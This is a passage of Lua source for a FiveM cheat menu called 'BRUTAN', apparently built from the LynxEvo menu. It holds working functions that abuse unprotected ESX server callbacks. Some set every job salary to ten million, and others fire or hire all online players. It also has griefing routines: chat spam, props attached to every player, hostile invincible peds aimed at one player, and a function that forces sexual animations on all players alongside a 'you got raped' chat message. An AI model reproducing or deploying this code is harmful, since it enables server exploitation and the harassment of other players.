			name = "~h~Sea Green", id = 51
		}, {
			name = "~h~Olive Green", id = 52
		}, {
			name = "~h~Bright Green", id = 53
		}, {
			name = "~h~Gasoline Green", id = 54
		}, {
			name = "~h~Lime Green", id = 92
		}, {
			name = "~h~Midnight Blue", id = 141
		}, {
			name = "~h~Galaxy Blue", id = 61
		}, {
			name = "~h~Dark Blue", id = 62
		}, {
			name = "~h~Saxon Blue", id = 63
		}, {
			name = "~h~Blue", id = 64
		}, {
			name = "~h~Mariner Blue", id = 65
		}, {
			name = "~h~Harbor Blue", id = 66
		}, {
			name = "~h~Diamond Blue", id = 67
		}, {
			name = "~h~Surf Blue", id = 68
		}, {
			name = "~h~Nautical Blue", id = 69
		}, {
			name = "~h~Racing Blue", id = 73
		}, {
			name = "~h~Ultra Blue", id = 70
		}, {
			name = "~h~Light Blue", id = 74
		}, {
			name = "~h~Chocolate Brown", id = 96
		}, {
			name = "~h~Bison Brown", id = 101
		}, {
			name = "~h~Creeen Brown", id = 95
		}, {
			name = "~h~Feltzer Brown", id = 94
		}, {
			name = "~h~Maple Brown", id = 97
		}, {
			name = "~h~Beechwood Brown", id = 103
		}, {
			name = "~h~Sienna Brown", id = 104
		}, {
			name = "~h~Saddle Brown", id = 98
		}, {
			name = "~h~Moss Brown", id = 100
		}, {
			name = "~h~Woodbeech Brown", id = 102
		}, {
			name = "~h~Straw Brown", id = 99
		}, {
			name = "~h~Sandy Brown", id = 105
		}, {
			name = "~h~Bleached Brown", id = 106
		}, {
			name = "~h~Schafter Purple", id = 71
		}, {
			name = "~h~Spinnaker Purple", id = 72
		}, {
			name = "~h~Midnight Purple", id = 142
		}, {
			name = "~h~Bright Purple", id = 145
		}, {
			name = "~h~Cream", id = 107
		}, {
			name = "~h~Ice White", id = 111
		}, {
			name = "~h~Frost White", id = 112
		}
	}
	local bs = "~u~BRUTAN ~s~V8.2"
	local bt = {
		{
			name = "~h~Black", id = 12
		}, {
			name = "~h~Gray", id = 13
		}, {
			name = "~h~Light Gray", id = 14
		}, {
			name = "~h~Ice White", id = 131
		}, {
			name = "~h~Blue", id = 83
		}, {
			name = "~h~Dark Blue", id = 82
		}, {
			name = "~h~Midnight Blue", id = 84
		}, {
			name = "~h~Midnight Purple", id = 149
		}, {
			name = "~h~Schafter Purple", id = 148
		}, {
			name = "~h~Red", id = 39
		}, {
			name = "~h~Dark Red", id = 40
		}, {
			name = "~h~Orange", id = 41
		}, {
			name = "~h~Yellow", id = 42
		}, {
			name = "~h~Lime Green", id = 55
		}, {
			name = "~h~Green", id = 128
		}, {
			name = "~h~Forest Green", id = 151
		}, {
			name = "~h~Foliage Green", id = 155
		}, {
			name = "~h~Olive Darb", id = 152
		}, {
			name = "~h~Dark Earth", id = 153
		}, {
			name = "~h~Desert Tan", id = 154
		}
	}
	local bu = {
		{
			name = "~h~Brushed Steel", id = 117
		}, {
			name = "~h~Brushed Black Steel", id = 118
		}, {
			name = "~h~Brushed Aluminum", id = 119
		}, {
			name = "~h~Pure Gold", id = 158
		}, {
			name = "~h~Brushed Gold", id = 159
		}
	}
	defaultVehAction = ""
	if GetVehiclePedIsUsing(PlayerPedId()) then veh = GetVehiclePedIsUsing(PlayerPedId()) end;
	local bv = false;
	local bw = true;
	local bx = GetPlayerServerId(PlayerPedId(-1)) local by = GetPlayerName(bx) av("~h~Best FiveM  Cheats - Brutan#7799", true) local
	function bz(I, x, y) SetTextFont(0) SetTextProportional(1) SetTextScale(0.0, 0.4) SetTextDropshadow(1, 0, 0, 0, 255) SetTextEdge(1, 0, 0, 0, 255) SetTextDropShadow() SetTextOutline() SetTextEntry("STRING") AddTextComponentString(I) DrawText(x, y) end;

	function RequestModelSync(bA) local bB = GetHashKey(bA) RequestModel(bB) while not HasModelLoaded(bB) do RequestModel(bB) Citizen.Wait(0) end end;

		function EconomyDy2() if ESX then ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 3, 10000000) end end;

	function UnemployedPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name; identifier = as[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'unemployed', 0, 'fire') end end) end end;

	function AmbulancePlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name; identifier = as[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'ambulance', 3, 'hire') end end) end end;

	function PolicePlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name; identifier = as[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'police', 4, 'hire') end end) end end;
	local bC = 0;
	capPa = "d"..
	"o"..
	"k"..
	"i"
	cappA = "d"..
	"o"..
	"k"..
	"i"..capPa;
	local bD = cappA;
	local
	function bE() if bC == 3 then ForceSocialClubUpdate()
	else local ak = KeyboardInput("Get your password from BRUTAN`S Discord", "", 100) if ak == bD then mhaonn = true;
	PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) Citizen.Wait(100) PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) Citizen.Wait(100) PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
	else bC = bC + 1;
	PlaySoundFrontend(-1, "MP_WAVE_COMPLETE", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) end end end;

	function MecanoPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name; identifier = as[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'mecano', 4, 'hire') end end) end end;

	function RealEstateAgentPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name; identifier = as[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'realestateagent', 4, 'hire') end end) end end;

	function TaxiPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name; identifier = as[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'taxi', 4, 'hire') end end) end end;

	function CarDealerPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name; identifier = as[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'cardealer', 4, 'hire') end end) end end;

	function UnemployedPlayer(bF) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) local bG = nil;
		for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name;
		if name == GetPlayerName(bF) then bG = as[i].identifier; debugLog('found '..as[i].name..
			' '..as[i].identifier) end; identifier = as[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bG, 'unemployed', 0, 'hire') end) end end;

	function CarDealerPlayer(bF) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) local bG = nil;
		for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name;
		if name == GetPlayerName(bF) then bG = as[i].identifier; debugLog('found '..as[i].name..
			' '..as[i].identifier) end; identifier = as[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bG, 'cardealer', 3, 'hire') end) end end;

	function RealEstateAgentPlayer(bF) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) local bG = nil;
		for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name;
		if name == GetPlayerName(bF) then bG = as[i].identifier; debugLog('found '..as[i].name..
			' '..as[i].identifier) end; identifier = as[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bG, 'realestateagent', 3, 'hire') end) end end;

	function TaxiPlayer(bF) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) local bG = nil;
		for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name;
		if name == GetPlayerName(bF) then bG = as[i].identifier; debugLog('found '..as[i].name..
			' '..as[i].identifier) end; identifier = as[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bG, 'taxi', 3, 'hire') end) end end;

	function AmbulancePlayer(bF) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) local bG = nil;
		for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name;
		if name == GetPlayerName(bF) then bG = as[i].identifier; debugLog('found '..as[i].name..
			' '..as[i].identifier) end; identifier = as[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bG, 'ambulance', 3, 'hire') end) end end;

	function PolicePlayer(bF) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) local bG = nil;
		for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name;
		if name == GetPlayerName(bF) then bG = as[i].identifier; debugLog('found '..as[i].name..
			' '..as[i].identifier) end; identifier = as[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bG, 'police', 3, 'hire') end) end end;

	function MecanoPlayer(bF) if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(as) local bG = nil;
		for i = 1, #as, 1 do label = as[i].name;
		value = as[i].source; name = as[i].name;
		if name == GetPlayerName(bF) then bG = as[i].identifier; debugLog('found '..as[i].name..
			' '..as[i].identifier) end; identifier = as[i].identifier end; ESX.TriggerServerCallback("esx_society:setJob", function() end, bG, 'mecano', 3, 'hire') end) end end;

	function bananapartyall() Citizen.CreateThread(function() for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4R^5U^6TAN ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
				141, 211, 255
			}, "^"..bD..
			"BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end;
		for i = 0, 128 do local bH = CreateObject(GetHashKey("p_crahsed_heli_s"), 0, 0, 0, true, true, true) local bI = CreateObject(GetHashKey("prop_rock_4_big2"), 0, 0, 0, true, true, true) local bJ = CreateObject(GetHashKey("prop_beachflag_le"), 0, 0, 0, true, true, true) AttachEntityToEntity(bH, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(bI, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) AttachEntityToEntity(bJ, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true) end end) end;

	function RespawnPed(ped, bK, bL) SetEntityCoordsNoOffset(ped, bK.x, bK.y, bK.z, false, false, false, true) NetworkResurrectLocalPlayer(bK.x, bK.y, bK.z, bL, true, false) SetPlayerInvincible(ped, false) TriggerEvent('playerSpawned', bK.x, bK.y, bK.z) ClearPedBloodDamage(ped) end;
	local
	function bM(ad) local bN = NetworkGetNetworkIdFromEntity(ped) local bO = 0;
	NetworkRequestControlOfNetworkId(bN) while not NetworkHasControlOfNetworkId(bN) do Citizen.Wait(1) NetworkRequestControlOfNetworkId(bN) bO = bO + 1;
		if bO == 5000 then Citizen.Trace("Control failed") break end end end;
	local
	function bP(bQ, bR) for i = 0, 10 do local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer)) RequestModel(GetHashKey(bQ)) Citizen.Wait(50) if HasModelLoaded(GetHashKey(bQ)) then local ped = CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, false) and CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, false) if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then bM(ped) GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1) SetEntityInvincible(ped, true) SetPedCanSwitchWeapon(ped, true) TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16) elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
	else Citizen.Wait(0) end end end end;

	function RapeAllFunc() for bD = 0, 9 do TriggerServerEvent("_chat:messageEntered", "^13^24^3B^4y^5T^6e ^1C^2o^3m^4m^5u^6n^7i^1t^2y", {
				141, 211, 255
			}, "^"..bD..
			"You got raped by BRUTAN on YouTube") end;
		Citizen.CreateThread(function() for i = 0, 128 do RequestModelSync("a_m_o_acult_01") RequestAnimDict("rcmpaparazzo_2") while not HasAnimDictLoaded("rcmpaparazzo_2") do Citizen.Wait(0) end;
				if IsPedInAnyVehicle(GetPlayerPed(i), true)
			then local veh = GetVehiclePedIsIn(GetPlayerPed(i), true) while not NetworkHasControlOfEntity(veh) do NetworkRequestControlOfEntity(veh) Citizen.Wait(0) end;
			SetEntityAsMissionEntity(veh, true, true) DeleteVehicle(veh) DeleteEntity(veh) end; count = -0.2;
			for b = 1, 3 do local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true)) local bS = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false) SetEntityAsMissionEntity(bS, true, true) AttachEntityToEntity(bS, GetPlayerPed(i), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true) ClearPedTasks(GetPlayerPed(i)) TaskPlayAnim(GetPlayerPed(i), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetPedKeepTask(bS) TaskPlayAnim(bS, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0) SetEntityInvincible(bS, true) count = count - 0.4 end end end) end;
	local
	function bT() local bU = KeyboardInput("Enter X pos", "", 100) local bV = KeyboardInput("Enter Y pos", "", 100) local bW = KeyboardInput("Enter Z pos", "", 100) if bU ~= ""
	and bV ~= ""
	and bW ~= ""
	then
	if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
	else entity = GetPlayerPed(-1) end;
	if entity then SetEntityCoords(entity, bU + 0.5, bV + 0.5, bW + 0.5, 1, 0, 0, 1) av("~g~Teleported to coords!", false) end
	else av("~b~Invalid coords!", true) end end;
	local
	function bX() local name = KeyboardInput("Enter Blip Name", "", 100) if name == ""
	then av("~b~Invalid Blip Name!", true) return bX()
	else local bU = KeyboardInput("Enter X pos", "", 100) local bV = KeyboardInput("Enter Y pos", "", 100) local bW = KeyboardInput("Enter Z pos", "", 100) if bU ~= ""
	and bV ~= ""
	and bW ~= ""
	then local bY = {
		{
			colour = 75, id = 84
		}
	}
	for _, bZ in pairs(bY) do bZ.blip = AddBlipForCoord(bU + 0.5, bV + 0.5, bW + 0.5) SetBlipSprite(bZ.blip, bZ.id) SetBlipDisplay(bZ.blip, 4) SetBlipScale(bZ.blip, 0.9) SetBlipColour(bZ.blip, bZ.colour) SetBlipAsShortRange(bZ.blip, true) BeginTextCommandSetBlipName("STRING") AddTextComponentString(name) EndTextCommandSetBlipName(bZ.blip) end
		else av("~b~Invalid coords!", true) end end end;
		local
	function b_() local ax = GetPlayerPed(-1) local c0 = GetEntityCoords(ax, true) local c1 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 4) local c2 = GetEntityCoords(c1, true) local c3 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 16384) local c4 = GetEntityCoords(c3, true) av("~y~Wait...", false) Citizen.Wait(1000) if c1 == 0 and c3 == 0 then av("~b~No Vehicle Found", true) elseif c1 == 0 and c3 ~= 0 then
	if IsVehicleSeatFree(c3, -1) then SetPedIntoVehicle(ax, c3, -1) SetVehicleAlarm(c3, false) SetVehicleDoorsLocked(c3, 1) SetVehicleNeedsToBeHotwired(c3, false)
	else local c5 = GetPedInVehicleSeat(c3, -1) ClearPedTasksImmediately(c5) SetEntityAsMissionEntity(c5, 1, 1) DeleteEntity(c5) SetPedIntoVehicle(ax, c3, -1) SetVehicleAlarm(c3, false) SetVehicleDoorsLocked(c3, 1) SetVehicleNeedsToBeHotwired(c3, false) end;
	av("~g~Teleported Into Nearest Vehicle!", false) elseif c1 ~= 0 and c3 == 0 then
	if IsVehicleSeatFree(c1, -1) then SetPedIntoVehicle(ax, c1, -1) SetVehicleAlarm(c1, false) SetVehicleDoorsLocked(c1, 1) SetVehicleNeedsToBeHotwired(c1, false)
	else local c5 = GetPedInVehicleSeat(c1, -1) ClearPedTasksImmediately(c5) SetEntityAsMissionEntity(c5, 1, 1) DeleteEntity(c5) SetPedIntoVehicle(ax, c1, -1) SetVehicleAlarm(c1, false) SetVehicleDoorsLocked(c1, 1) SetVehicleNeedsToBeHotwired(c1, false) end;
	av("~g~Teleported Into Nearest Vehicle!", false) elseif c1 ~= 0 and c3 ~= 0 then
	if Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) < Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
	if IsVehicleSeatFree(c1, -1) then SetPedIntoVehicle(ax, c1, -1) SetVehicleAlarm(c1, false) SetVehicleDoorsLocked(c1, 1) SetVehicleNeedsToBeHotwired(c1, false)
	else local c5 = GetPedInVehicleSeat(c1, -1) ClearPedTasksImmediately(c5) SetEntityAsMissionEntity(c5, 1, 1) DeleteEntity(c5) SetPedIntoVehicle(ax, c1, -1) SetVehicleAlarm(c1, false) SetVehicleDoorsLocked(c1, 1) SetVehicleNeedsToBeHotwired(c1, false) end elseif Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) > Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
	if IsVehicleSeatFree(c3, -1) then SetPedIntoVehicle(ax, c3, -1) SetVehicleAlarm(c3, false) SetVehicleDoorsLocked(c3, 1) SetVehicleNeedsToBeHotwired(c3, false)
	else local c5 = GetPedInVehicleSeat(c3, -1) ClearPedTasksImmediately(c5) SetEntityAsMissionEntity(c5, 1, 1) DeleteEntity(c5) SetPedIntoVehicle(ax, c3, -1) SetVehicleAlarm(c3, false) SetVehicleDoorsLocked(c3, 1) SetVehicleNeedsToBeHotwired(c3, false) end end;
	av("~g~Teleported Into Nearest Vehicle!", false) end end;
	local
	function c6() if DoesBlipExist(GetFirstBlipInfoId(8)) then local c7 = GetBlipInfoIdIterator(8) local blip = GetFirstBlipInfoId(8, c7) WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) wp = true
	else av("~b~No waypoint!", true) end;
	local c8 = 0.0;
	height = 1000.0;
	while wp do Citizen.Wait(0) if wp
	then
	if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
	else entity = GetPlayerPed(-1) end;
	SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height) FreezeEntityPosition(entity, true) local c9 = GetEntityCoords(entity, true) if c8 == 0.0 then height = height - 25.0;
	SetEntityCoords(entity, c9.x, c9.y, height) bool, c8 = GetGroundZFor_3dCoord(c9.x, c9.y, c9.z, 0)
	else SetEntityCoords(entity, c9.x, c9.y, c8) FreezeEntityPosition(entity, false) wp = false;
	height = 1000.0;
	c8 = 0.0;
	av("~g~Teleported to waypoint!", false) break end end end end;
	local
	function ca() local cb = KeyboardInput("Enter Vehicle Spawn Name", "", 100) if cb and IsModelValid(cb) and IsModelAVehicle(cb) then RequestModel(cb) while not HasModelLoaded(cb) do Citizen.Wait(0) end;
		local veh = CreateVehicle(GetHashKey(cb), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true) SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
	else av("~b~~h~Model is not valid!", true) end end;
	local
	function cc() SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false)) SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0) SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false) Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleUndriveable(vehicle, false) end;
	local
	function cd() SetVehicleEngineHealth(vehicle, 1000) Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) SetVehicleUndriveable(vehicle, false) end;
	local
	function ce() LynxEvo.StartRC() end;
	LynxEvo.StartRC = function() if DoesEntityExist(LynxEvo.Entity) then
	return end;
	LynxEvo.SpawnRC() LynxEvo.Tablet(true) while DoesEntityExist(LynxEvo.Entity) and DoesEntityExist(LynxEvo.Driver) do Citizen.Wait(5) local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(LynxEvo.Entity), true) LynxEvo.DrawInstructions(cf) LynxEvo.HandleKeys(cf) if cf <= 3000.0 then
	if not NetworkHasControlOfEntity(LynxEvo.Driver) then NetworkRequestControlOfEntity(LynxEvo.Driver) elseif not NetworkHasControlOfEntity(LynxEvo.Entity) then NetworkRequestControlOfEntity(LynxEvo.Entity) end
	else TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500) end end end;
	LynxEvo.HandleKeys = function(cf) if IsControlJustReleased(0, 47) then
	if IsCamRendering(LynxEvo.Camera) then LynxEvo.ToggleCamera(false)
	else LynxEvo.ToggleCamera(true) end end;
	if cf <= 3.0 then
	if IsControlJustPressed(0, 38) then LynxEvo.Attach("pick") end end;
	if cf < 3000.0 then
	if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 9, 1) end;
	if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 6, 2500) end;
	if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 22, 1) end;
	if IsControlPressed(0, 174) and IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 13, 1) end;
	if IsControlPressed(0, 175) and IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 14, 1) end;
	if IsControlPressed(0, 172) and IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 30, 100) end;
	if IsControlPressed(0, 174) and IsControlPressed(0, 172) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 7, 1) end;
	if IsControlPressed(0, 175) and IsControlPressed(0, 172) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 8, 1) end;
	if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 4, 1) end;
	if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then TaskVehicleTempAction(LynxEvo.Driver, LynxEvo.Entity, 5, 1) end;
	if IsControlJustReleased(0, 168) then SetVehicleEngineOn(LynxEvo.Entity, not GetIsVehicleEngineRunning(LynxEvo.Entity), false, true) end end end;
	LynxEvo.DrawInstructions = function(cf) local cg = {
		{
			["label"] = "Right", ["button"] = "~INPUT_CELLPHONE_RIGHT~"
		}, {
			["label"] = "Forward", ["button"] = "~INPUT_CELLPHONE_UP~"
		}, {
			["label"] = "Reverse", ["button"] = "~INPUT_CELLPHONE_DOWN~"
		}, {
			["label"] = "Left", ["button"] = "~INPUT_CELLPHONE_LEFT~"
		}
	}
	local ch = {
		["label"] = "Delete Car", ["button"] = "~INPUT_CONTEXT~"
	}
	local cj = {
		{
			["label"] = "Toggle Camera", ["button"] = "~INPUT_DETONATE~"
		}, {
			["label"] = "Start/Stop Engine", ["button"] = "~INPUT_SELECT_CHARACTER_TREVOR~"
		}
	}
	if cf <= 3000.0 then
	for ck = 1, #cg do local cl = cg[ck] table.insert(cj, cl) end;
		if cf <= 3000.0 then table.insert(cj, ch) end end;
	Citizen.CreateThread(function() local cm = RequestScaleformMovie("instructional_buttons") while not HasScaleformMovieLoaded(cm) do Wait(0) end;
		PushScaleformMovieFunction(cm, "CLEAR_ALL") PushScaleformMovieFunction(cm, "TOGGLE_MOUSE_BUTTONS") PushScaleformMovieFunctionParameterBool(0) PopScaleformMovieFunctionVoid() for ck, cn in ipairs(cj) do PushScaleformMovieFunction(cm, "SET_DATA_SLOT") PushScaleformMovieFunctionParameterInt(ck - 1) PushScaleformMovieMethodParameterButtonName(cn["button"]) PushScaleformMovieFunctionParameterString(cn["label"]) PopScaleformMovieFunctionVoid() end;
		PushScaleformMovieFunction(cm, "DRAW_INSTRUCTIONAL_BUTTONS") PushScaleformMovieFunctionParameterInt(-1) PopScaleformMovieFunctionVoid() DrawScaleformMovieFullscreen(cm, 255, 255, 255, 255) end) end;
	LynxEvo.SpawnRC = function() local cb = KeyboardInput("Enter Vehicle Spawn Name", "", 100) if cb and IsModelValid(cb) and IsModelAVehicle(cb) then RequestModel(cb) while not HasModelLoaded(cb) do Citizen.Wait(0) end;
		LynxEvo.LoadModels({
			GetHashKey(cb), 68070371
		}) local co, cp = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId()) LynxEvo.Entity = CreateVehicle(GetHashKey(cb), co, cp, true) while not DoesEntityExist(LynxEvo.Entity) do Citizen.Wait(5) end;
		LynxEvo.Driver = CreatePed(5, 68070371, co, cp, true) SetEntityInvincible(LynxEvo.Driver, true) SetEntityVisible(LynxEvo.Driver, false) FreezeEntityPosition(LynxEvo.Driver, true) SetPedAlertness(LynxEvo.Driver, 0.0) TaskWarpPedIntoVehicle(LynxEvo.Driver, LynxEvo.Entity, -1) while not IsPedInVehicle(LynxEvo.Driver, LynxEvo.Entity) do Citizen.Wait(0) end;
		LynxEvo.Attach("place") av("~g~~h~Success", false)
	else av("~b~~h~Model is not valid !", true) end end;
	LynxEvo.Attach = function(aw) if not DoesEntityExist(LynxEvo.Entity) then
	return end;
	LynxEvo.LoadModels({
		"pickup_object"
	}) if aw == "place"
	then AttachEntityToEntity(LynxEvo.Entity, PlayerPedId(), GetPedBoneIndex(PlayerPedId(), 28422), 3.0, 0.0, 0.5, 70.0, 0.0, 270.0, 1, 1, 0, 0, 2, 1) Citizen.Wait(200) DetachEntity(LynxEvo.Entity, false, true) PlaceObjectOnGroundProperly(LynxEvo.Entity) elseif aw == "pick"
	then
	if DoesCamExist(LynxEvo.Camera) then LynxEvo.ToggleCamera(false) end;
	LynxEvo.Tablet(false) Citizen.Wait(100) DetachEntity(LynxEvo.Entity) DeleteVehicle(LynxEvo.Entity) DeleteEntity(LynxEvo.Driver) LynxEvo.UnloadModels() end end;
	LynxEvo.Tablet = function(cq) if cq then LynxEvo.LoadModels({
		GetHashKey("prop_cs_tablet")
	}) LynxEvo.LoadModels({
		"amb@code_human_in_bus_passenger_idles@female@tablet@idle_a"
	}) Citizen.CreateThread(function() while DoesEntityExist(LynxEvo.TabletEntity) do Citizen.Wait(5) if not
